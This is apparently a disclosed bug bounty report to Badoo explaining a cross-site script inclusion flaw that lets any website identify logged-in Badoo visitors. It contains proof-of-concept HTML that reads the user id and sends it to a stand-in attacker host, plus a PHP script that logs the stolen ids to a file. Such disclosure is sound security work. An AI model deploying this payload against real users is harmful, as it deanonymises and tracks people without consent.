Summary:
Despite this issue was reported in #130453 first, there was some misunderstanding. Reporter in #130453 was quite aggressive and unpleasant instead of describing in details what's wrong. Moreover, he wrote an article about this on [public resource]( https://www.seekurity.com/blog/general/badoo-hotornot-privacy-disclosure-feature-not-a-bug/).

@saeedhashem on the other hand was quite kind and informative. That's why we decided to award this report with the bounty, not the first one.

Hey ,

Regarding this report #130453 , I'm pretty sure that there's a little misunderstanding of the issue , so please let me clarify the issue a bit more .

The issue is not about the disclosure of user's id , that wouldn't be considered an issue at all because every website puts user's id in the user's profile usually , The issue here is the disclosure of badoo user who visited the webpage which contained the exploit code , that allows any site owner or advertisement campaign designer to exploit this issue maliciously by escalating a public and general ads campaign to a targeted ads campaign after collecting the users who were interested in the general campaign .  

Let's clarify a bit further by some details and exploit scenario .

###What made the vulnerability appear ?

1. This script `https://badoo.com/worker-scope/chrome-service-worker.js?ws=1` being contained information dependent on the currently logged in user .
2. This information can identify the currently logged in user.
3. The same script being public , and can be called and fetched by any rogue script on any website  .


###What makes it an issue ?

It's considered as a privacy violation . If I visited some website , the website owner is not supposed to figure out my identity , but this issue allow him to do so .

Additionally the issue allows any one to figure out weather I'm logged in or logged out , and by which account .

###How can any one exploit the issue maliciously ? 

Let's consider the following as an exploit scenario .

I'm a commercial website owner who  found out about this issue and decided to take advantage to my new product advertisement campaign .

So , I designed a plan as following :

1. Start a public and general campaign by setting up the new product page in my website and distributing the link to the page every where , including badoo .
2. The new product page should contain the Exploit code written below .

```
<html>
<script src=https://badoo.com/worker-scope/chrome-service-worker.js?ws=1></script>
</head>
<body>
<script>
function UnmaskUser(str) {
return str.split('=')[0];
}
window.onload = function(){
var user = UnmaskUser(user_id);
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://MyfancyEvilWebsite.com/identity-stealer.php?victim=' user , true);
xhr.send();
};
</script>
</html>
```
And the `identity-stealer.php` should have the code :
```
<?php
$user = $_GET['victim'];
$fd = fopen("badoo-users-interested-in-my-product.txt","a");
 fwrite($fd, $user);
 fclose($fd);
?>
```

3. The people who may be interested in my new product will start to visit my new product page .
4. After a period of time I will be having a txt file `badoo-users-interested-in-my-product.txt` on my server with a list of ids of all badoo users who have visited my new product page while they are logged into badoo .
5. Now I can start a more specific and targeted advertisement campaign by contacting those badoo users directly by private messages or emails .


##Note : 
This should be clarified the matter , so if you still think this issue isn't considered a security issue or privacy violation you can close the report as informative .


Best regards , 
Thanks ,
